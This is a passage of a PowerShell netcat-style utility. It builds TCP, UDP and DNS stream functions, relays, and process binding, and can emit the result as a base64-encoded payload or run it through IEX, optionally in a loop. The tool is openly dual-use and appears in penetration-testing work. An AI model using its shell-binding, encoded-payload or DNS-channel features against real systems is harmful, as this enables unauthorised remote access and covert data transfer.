    Write-Verbose "Set Stream 1: UDP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
    if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
    else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
  }
  elseif($dns -ne "")
  {
    Write-Verbose "Set Stream 1: DNS"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
    if($l){return "This feature is not available."}
    else{$InvokeString = "Main @('$c','$p','$dns',$dnsft) "}
  }
  else
  {
    Write-Verbose "Set Stream 1: TCP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
    if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
    else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
  }
  
  if($e -ne "")
  {
    Write-Verbose "Set Stream 2: Process"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
    $InvokeString += "@('$e')`n`n"
  }
  elseif($ep)
  {
    Write-Verbose "Set Stream 2: Powershell"
    $InvokeString += "`n`n"
  }
  elseif($r -ne "")
  {
    if($r.split(":")[0].ToLower() -eq "udp")
    {
      Write-Verbose "Set Stream 2: UDP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
    if($r.split(":")[0].ToLower() -eq "dns")
    {
      Write-Verbose "Set Stream 2: DNS"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
      if($r.split(":").Count -eq 2){return "This feature is not available."}
      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft) ")}
      else{return "Bad relay format."}
    }
    elseif($r.split(":")[0].ToLower() -eq "tcp")
    {
      Write-Verbose "Set Stream 2: TCP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
  }
  else
  {
    Write-Verbose "Set Stream 2: Console"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
    $InvokeString += ("@('" + $o + "')")
  }
  
  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
  $InvokeString = ($FunctionString + $InvokeString)
  ########## GENERATE PAYLOAD ##########
  
  ########## RETURN GENERATED PAYLOADS ##########
  if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
  elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
  ########## RETURN GENERATED PAYLOADS ##########
  
  ########## EXECUTION ##########
  $Output = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        $Output += IEX $InvokeString
        Start-Sleep -s 2
        Write-Verbose "Repetition Enabled: Restarting..."
      }
    }
    else
    {
      $Output += IEX $InvokeString
    }
  }
  finally
  {
    if($Output -ne $null)
    {
      if($of -eq ""){$Output}
      else{[io.file]::WriteAllBytes($of,$Output)}
    }
  }
  ########## EXECUTION ##########
}
